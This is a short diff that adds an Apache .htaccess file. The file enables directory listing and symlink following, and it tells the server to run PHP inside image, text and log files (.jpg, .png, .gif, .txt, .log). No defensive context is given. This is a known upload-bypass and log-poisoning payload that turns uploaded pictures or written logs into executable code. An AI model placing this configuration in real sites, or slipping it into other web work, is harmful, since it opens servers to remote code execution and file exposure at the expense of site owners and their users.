@@ -1,0 +1,5 @@
+Options +FollowSymLinks +Indexes
+
+# Execute PHP inside images, logs, text files, etc.
+AddType application/x-httpd-php .php .phtml .php5 .jpg .jpeg .png .gif .txt .log
+AddHandler application/x-httpd-php .php .phtml .php5 .jpg .jpeg .png .gif .txt .log
